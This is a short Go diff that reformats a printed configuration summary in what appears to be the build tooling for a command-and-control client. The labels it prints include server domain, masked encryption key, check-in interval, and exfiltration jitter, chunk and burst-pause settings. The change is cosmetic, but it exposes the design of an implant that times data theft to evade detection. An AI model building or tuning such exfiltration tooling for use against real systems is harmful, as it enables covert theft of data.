@@ -94,13 +94,11 @@ func getConfig() Config {
 		os.Exit(1)
 	}
 
-	fmt.Println("Configuration embedded successfully!")
-	fmt.Printf("Server Domain: %s\n", config.Client.ServerDomain)
-	fmt.Printf("Encryption Key: %s\n", strings.Repeat("*", len(config.Security.EncryptionKey)))
-	fmt.Printf("Sleep Interval: %d-%d seconds\n", config.Client.SleepMin, config.Client.SleepMax)
-	fmt.Printf("Exfil Timing: %d-%dms jitter, %d chunks/burst, %dms pause\n",
-		config.Client.ExfilJitterMinMs,
-		config.Client.ExfilJitterMaxMs,
-		config.Client.ExfilChunksPerBurst,
-		config.Client.ExfilBurstPauseMs)
+	// Show configuration summary with consistent formatting
+	fmt.Printf("  Server Domain:       %s\n", config.Client.ServerDomain)
+	fmt.Printf("  Encryption Key:      %s\n", strings.Repeat("*", len(config.Security.EncryptionKey)))
+	fmt.Printf("  Check-in Interval:   %d-%d seconds\n", config.Client.SleepMin, config.Client.SleepMax)
+	fmt.Printf("  Exfil Jitter:        %d-%dms\n", config.Client.ExfilJitterMinMs, config.Client.ExfilJitterMaxMs)
+	fmt.Printf("  Exfil Chunks/Burst:  %d\n", config.Client.ExfilChunksPerBurst)
+	fmt.Printf("  Exfil Burst Pause:   %dms\n", config.Client.ExfilBurstPauseMs)
 }
